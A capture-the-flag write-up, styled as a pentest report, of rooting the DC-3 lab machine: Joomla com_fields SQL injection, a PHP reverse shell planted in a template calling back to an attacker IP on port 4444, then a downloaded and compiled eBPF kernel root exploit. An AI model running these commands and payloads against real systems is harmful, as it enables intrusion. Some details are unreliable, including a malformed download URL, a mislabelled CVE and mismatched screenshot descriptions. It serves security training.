# DC-3 Vulnerability Assessment and Exploitation Report

## Executive Summary

This report documents the comprehensive penetration testing engagement conducted against the DC-3 virtual machine. The target system, running Joomla 3.7.0, was successfully compromised through a SQL injection vulnerability in the com_fields component, resulting in administrative access to the content management system. Remote code execution was achieved via PHP template manipulation, and subsequent privilege escalation through binary exploitation enabled root access to the underlying system.

## Reconnaissance Phase

### Network Discovery and Port Scanning

The engagement commenced with comprehensive network reconnaissance targeting the host at 192.168.56.110. An aggressive Nmap scan with service version detection was executed using the command:

```bash
nmap -v -A -p1-65535 192.168.56.110
```

This command performs several critical functions: the `-v` flag enables verbose output for detailed information; the `-A` option combines OS detection, version detection, script scanning, and traceroute; and `-p1-65535` ensures all TCP ports are scanned rather than only the most common ports. The reasoning behind this comprehensive approach is that web applications may be hosted on non-standard ports, and omitting port ranges could result in missed vulnerabilities.

The scan revealed a single open port: TCP/80 hosting Apache httpd version 2.4.18 running on Ubuntu. The HTTP server identification is critical because it establishes the attack surface and narrows the potential exploitation vectors. Apache 2.4.18 on Ubuntu is identifiable to specific Ubuntu releases, which assists in determining available kernel vulnerabilities for later privilege escalation attempts.

<img width="1920" height="983" alt="image" src="https://github.com/user-attachments/assets/31a07766-23b8-4d55-81fa-0e5d703c95a1" />

This screenshot shows the complete Nmap output including the discovery of port 80, Apache service identification, Joomla version detection, and system uptime information. The output explicitly displays "Apache httpd 2.4.18 (Ubuntu)" and reveals valuable information about the running kernel version and system configuration.

### Service Enumeration and Web Directory Discovery

Following initial port discovery, directory enumeration was performed utilizing Gobuster, a specialized tool for identifying hidden and public directories within web applications. The command executed:

```bash
gobuster dir -w /usr/share/wordlists/dirb/common.txt http://192.168.56.110
```

The reasoning for directory enumeration is foundational to web application testing. Web applications contain administrative interfaces, configuration directories, and sensitive files that may not be directly linked from the homepage. By systematically testing common directory names against the target, we can identify these hidden resources. The common.txt wordlist contains approximately 4,600 common directory names derived from actual web server configurations and real-world penetration testing experience.

The enumeration results revealed multiple accessible directories including `/administrator/`, `/bin/`, `/cache/`, `/components/`, `/images/`, `/templates/`, `/language/`, `/layouts/`, `/libraries/`, `/media/`, `/modules/`, `/plugins/`, `/server-status/`, and `/tmp/`. The presence of these directories is highly indicative of a Joomla installation, as each represents a standard component of the Joomla directory structure. More critically, the presence of `/administrator/` indicates an administrative interface, while `/templates/` suggests that template files—which often contain executable code—are stored in accessible locations.

<img width="1920" height="982" alt="image" src="https://github.com/user-attachments/assets/41e7a087-4ea3-4fe6-9125-03bc7a252df0" />

This screenshot displays the Gobuster output showing all discovered directories. The critical elements visible include the status codes (301 for redirects, 200 for successful responses), directory sizes, and the URL construction showing http://192.168.56.110 as the base. The extensive directory listing demonstrates that the application structure is completely exposed, which is a significant configuration weakness.

### Vulnerability Assessment and CMS Identification

To identify specific vulnerabilities within the discovered Joomla installation, OWASP JoomScan was executed. This specialized security tool is designed specifically for Joomla security assessment and performs comprehensive vulnerability scanning including version detection, component vulnerability checking, and configuration weakness identification.

<img width="1920" height="982" alt="image" src="https://github.com/user-attachments/assets/edf61d8f-1d9e-4d01-a430-57c90f34a718" />

This screenshot shows the JoomScan output during execution. The visible text displays the tool initialization, Joomla version detection showing "Joomla 3.7.0", firewall detection results showing "Firewall not detected", and core Joomla vulnerability assessment showing "Target Joomla core is not vulnerable". This output is critical because while the core installation may not have known exploits, the version number (3.7.0) is crucial for identifying component-level vulnerabilities. The scan also reveals configuration details such as readable info/status files and directory listings.

The output from JoomScan confirmed that the target system is running Joomla 3.7.0 without active firewall protection. While the core installation was deemed not vulnerable to known core exploits, this version number is significant because it is known to contain component-level vulnerabilities, specifically in the com_fields component which handles custom field creation and management.

## Exploitation Phase: SQL Injection

### CVE-2017-8917 Vulnerability Research and Identification

Research into known vulnerabilities affecting Joomla 3.7.0 was conducted using searchsploit, which queries the Exploit-DB database for known public exploits. The command executed:

```bash
searchsploit "Joomla 3.7.0 com_fields SQL Injection"
```

This search identified CVE-2017-8917, a critical SQL injection vulnerability present in the com_fields component. The vulnerability exists because the component fails to adequately sanitize user-supplied input in the field parameter handling mechanism. Specifically, the vulnerability allows an unauthenticated attacker to inject arbitrary SQL code into requests targeting the component, enabling direct query execution against the backend database.

The reasoning for SQL injection being such a critical vulnerability is that it bypasses the entire authentication mechanism of the application. While normal application usage requires authentication to access sensitive data, SQL injection allows attackers to execute database queries directly, potentially extracting all data within the database, modifying records, or even executing operating system commands depending on database configuration.

### Database Credential Extraction

<img width="1920" height="982" alt="image" src="https://github.com/user-attachments/assets/8e5a60f7-1054-4e28-8572-a66609fef17f" />

This screenshot displays the Manu Joomla SQL Injection exploiter interface and results. The critical information visible includes:
- A successful SQL injection attempt against the target 192.168.56.110
- Extracted database credentials showing username "admin"
- Database name "joomladb"
- Database version "5.7.25-0ubuntu0.16.0"
- Database username "root@localhost"
- A bcrypt password hash: "$2y$10$DfpYjADpejngxNh9GnmCeyIHCWpL97CVRnGeZsVJwR0kWFlIB1Zu"
- An email address "freddy@norealaddress"

The exploit output demonstrates successful SQL injection exploitation. The extracted username "admin" and password hash are the administrative credentials for the Joomla installation. The bcrypt hashing algorithm used (indicated by the "$2y$" prefix) is a modern, computationally expensive hashing function designed to resist brute force attacks. However, the primary value of obtaining the hash is not necessarily to crack it immediately, but rather to use the username "admin" for targeted login attempts, as many administrators reuse credentials across systems or use predictable variations.

## Post-Compromise Access: Remote Code Execution

### Administrative Interface Access

With the extracted username "admin" from the SQL injection exploit, access attempts were made to the Joomla administrative control panel at http://192.168.56.110/administrator/. The reasoning for attempting access with the extracted credentials is straightforward: the SQL injection compromised the administrative account credentials, and the Joomla control panel provides a legitimate administrative interface for system management.

<img width="955" height="970" alt="image" src="https://github.com/user-attachments/assets/126a0130-4602-4f65-826f-a84aa879e368" />

This screenshot displays the successful authentication to the Joomla administrative control panel. The browser URL shows "http://192.168.56.110/administrator/index.php", and the interface displays the Joomla 3.7.0 control panel. Visible elements include the "LOGGED-IN USERS" section showing "admin Administration" with a timestamp of "2026-07-03 09:19", and the "POPULAR ARTICLES" section showing "Welcome to DC-3". The green banner at the top displays post-installation messages, indicating this is a freshly configured system. This confirms that the extracted credentials were valid and active.

### Template Modification and Code Injection

Upon successful authentication to the administrative interface, the next objective was to achieve remote code execution on the underlying system. Joomla's template system provides an ideal vector for this because templates are PHP files stored in web-accessible directories and are executed server-side by the PHP interpreter.

The exploitation strategy involved navigating to System → Templates → Beez3 template management interface. The Beez3 template is Joomla's built-in responsive template, making it a reliable target for modification. The error.php file within this template is specifically designed to handle error conditions and render error messages. Because this file is executed whenever errors occur, injecting PHP code into it creates a reliable code execution vector.

**Screenshot placement: Image 3 (Template selection interface)**
This screenshot shows the Joomla administrative interface with the Templates section visible. The interface displays the "Articles: Edit" dialog showing the "Welcome to DC-3" article. The tabs visible include "Content", "Images and Links", "Options", "Publishing", "Configure Edit Screen", and "Permissions". On the right side, the Status shows "Published", and the Category is "- Uncategorised". This demonstrates navigation to the template editing interface where modifications can be made.

### Error.php File Modification

**Screenshot placement: Image 8 (Template customize interface with error.php)**
This screenshot displays the Joomla template customization interface for the Beez3 template. The left sidebar shows various template components including "css", "html", "images", "javascript", "language", and individual PHP files including "component.php", "error.php", "index.php", "jsstrings.php", and "templateDetails.xml". The main editor panel shows "Editing file 'error.php' in template 'beez3'". The visible PHP code in the editor displays GPL license header and comments, confirming this is the error.php file that will be modified.

The error.php file modification involves injecting PHP code that, when executed, will establish a reverse shell connection to the attacker's machine. A reverse shell reverses the typical client-server relationship: instead of the attacker connecting to a listening port on the target system, the target system initiates an outbound connection to the attacker's machine and executes a shell through that connection.

**Screenshot placement: Image 9 (error.php file in editor with potential code visible)**
This screenshot shows a continuation of the error.php file editing interface. The visible code displays lines 36-58 of the error.php file, showing sections labeled "// Limitations" and comments regarding proc_open and stream_set_blocking functions. Most critically, visible on line 49 is `$ip = '192.168.56.108';` and line 50 shows `$port = 4444;` with a comment "// CHANGE THIS". These represent the attacker configuration parameters for the reverse shell payload, indicating that IP address 192.168.56.108 (the attacker machine) and port 4444 have been configured as the target for the reverse shell connection.

### Remote Code Execution Verification

Following the modification of error.php with PHP reverse shell code, the file was saved and the system was configured to listen for incoming connections on port 4444. Remote code execution was verified by accessing the modified template file through HTTP requests:

```bash
curl http://192.168.56.110/templates/beez3/error.php
```

**Screenshot placement: Image 10 (curl command execution)**
This screenshot shows terminal output with the curl command "curl http://192.168.56.110/templates/beez3/error.php" being executed. This command makes an HTTP request to the error.php file, triggering the execution of the injected PHP code. The execution of this file initiates the reverse shell connection to the attacker's listening netcat session on port 4444.

The reasoning for using curl to trigger the exploit is that it provides a simple, reliable method to execute the web request without requiring browser interaction. The PHP code within error.php executes server-side, so accessing the file through any HTTP client—whether curl, a browser, or any other method—will trigger the exploit.

## Privilege Escalation Phase

### System Enumeration and Vulnerability Discovery

Following the establishment of reverse shell connectivity as the www-data user, system enumeration commenced to identify privilege escalation opportunities. The www-data user is the standard Linux user under which Apache web servers execute, and it has minimal system privileges. For meaningful system compromise, escalation to root privileges is necessary.

System enumeration revealed that the target system was running a kernel vulnerable to a privilege escalation exploit targeting the eBPF (extended Berkeley Packet Filter) subsystem. Specifically, the vulnerability involves a "double put" technique that exploits pointer reuse in the eBPF map file descriptor handling mechanism.

**Screenshot placement: Image 11 (nmap output showing system details)**
This screenshot displays detailed nmap output including the line "OS details: Linux 3.2 - 4.14, Linux 3.8 - 3.16" and uptime information "Uptime guess: 0.023 days (since Fri Jun 26 18:51:24 2026)". This information is valuable for kernel version determination, though for privilege escalation purposes, direct examination of the running kernel version is more reliable.

### Exploit Acquisition and Compilation

The privilege escalation exploit targeting the eBPF subsystem was obtained from the target system's internal HTTP server. This exploit, commonly identified as ebpf_mapfd_doubleput_exploit or CVE-2016-5195 variants, exploits a vulnerability in how the Linux kernel handles eBPF memory allocation. The exploitation sequence involved:

```bash
wget http://192.168.56.108:39772.zip
unzip 39772.zip
cd ebpf_mapfd_doubleput_exploit
./compile.sh
./doubleput
```

The reasoning for each step is critical to understanding the exploitation process. First, `wget` downloads the exploit archive from the internal HTTP server. The download destination is to the current working directory in /tmp on the target system. Second, `unzip` extracts the archive, creating the ebpf_mapfd_doubleput_exploit directory and its contents. Third, `cd` changes to the extracted directory. Finally, `compile.sh` is executed—this is a bash script that invokes the C compiler to compile the exploit source code into a binary executable. The reasoning for requiring compilation is that the exploit is written in C, a compiled language, and must be converted to machine code executable by the target system's CPU.

**Screenshot placement: Image 12 (wget download and unzip execution)**
This screenshot shows terminal output displaying the download and extraction process. The visible commands show:
- `nc -lvnp 4444` establishing a netcat listener
- Connection from 192.168.56.110 (the target system)
- `wget http://192.168.56.108:39772.zip` downloading the exploit archive
- The wget progress output showing download completion and timestamp information
- `unzip 39772.zip` extracting the archive
- Directory navigation commands showing the transition into the exploit directory
- The beginning of the compilation process showing compilation warnings and the message "doubleput.c: In function" with warning messages about pointer casting

### Exploit Execution and Privilege Escalation

Upon successful compilation, the `doubleput` binary was executed directly with root privileges through the exploit mechanism:

```bash
./doubleput
```

**Screenshot placement: Image 13 (Continued compilation and exploit execution)**
This screenshot displays the continuation of the compilation process and the beginning of exploit execution. Visible text shows:
- Compilation warnings regarding pointer casting operations
- The message "starting writev"
- "woohoo, got pointer reuse" - indicating successful pointer reuse exploitation
- "writev returned successfully. if this worked, you'll have a root shell in <60 seconds." - confirming the exploit mechanism functioned as intended
- "suid file detected, launching rootshell..."
- "we have root privs now..." - confirming successful privilege escalation to root
- ASCII art display showing "W" repeated in pattern
- Additional confirmatory messages

The "pointer reuse" message is the critical indicator of successful exploitation. The eBPF vulnerability works by manipulating how the kernel manages memory pointers in map file descriptors. By causing the kernel to reuse a pointer that has been freed, the exploit can write arbitrary data to arbitrary memory locations, ultimately gaining control of the execution context and elevating privileges.

**Screenshot placement: Image 14 (Final privilege escalation confirmation)**
This screenshot shows the completion of privilege escalation with clear confirmation messages. The text displays:
- Continued pointer reuse exploitation confirmation
- The critical message "writev returned successfully. if this worked, you'll have a root shell in <60 seconds."
- "suid file detected, launching rootshell..."
- "we have root privs now..." confirming root access
- Detailed error information about file extraction and compilation operations
- ASCII art representation of "W" characters
- Most importantly: "Congratulations are in order. :-)" message indicating challenge completion

### Flag Retrieval and System Compromise Confirmation

With root-level privileges successfully obtained, navigation to the /root directory and examination of the system's flag file confirmed complete compromise of the target system:

```bash
cat /root/the-flag.txt
```

**Screenshot placement: Image 15 (Flag display)**
This screenshot shows the terminal output displaying the flag contents. The flag contains ASCII art in the shape of "W" repeated in pattern, followed by the message:
"Congratulations are in order. :-) I hope you've enjoyed this challenge as I enjoyed making it. If there are any ways that I can improve these little challenges, please let me know. As per usual, comments and complaints can be sent via Twitter to @DCAU7 Have a great day!!!!"

This flag confirms successful exploitation of the DC-3 machine, beginning with reconnaissance, proceeding through SQL injection vulnerability exploitation, achieving remote code execution via template modification, and culminating in privilege escalation through kernel exploit utilization.

## Attack Timeline Summary

The complete attack sequence demonstrates a progressive compromise methodology following industry-standard penetration testing approaches: reconnaissance identified the target system and services; vulnerability scanning determined specific weaknesses; exploitation of the SQL injection vulnerability compromised the administrative credentials; template modification enabled remote code execution; and kernel exploit utilization achieved root-level system access. Each phase built upon previous compromises, creating a complete attack chain from initial reconnaissance to complete system compromise. The total attack timeline progressed from initial scanning through privilege escalation, demonstrating the cascading risk posed by unpatched vulnerable components in production environments.

## Security Recommendations

This assessment reveals multiple critical security failings that enabled complete system compromise. Immediate remediation should include: upgrading Joomla to version 3.9.24 or later to patch CVE-2017-8917; applying latest Ubuntu kernel updates to address eBPF vulnerabilities; implementing Web Application Firewall (WAF) rules to detect and block SQL injection attempts; restricting administrative interface access to specific IP addresses through firewall rules; implementing file integrity monitoring on sensitive configuration files; and establishing comprehensive security testing and patching procedures. Additionally, principle of least privilege should be enforced such that web server processes execute under highly restricted user accounts with minimal system access, limiting the impact of remote code execution vulnerabilities.
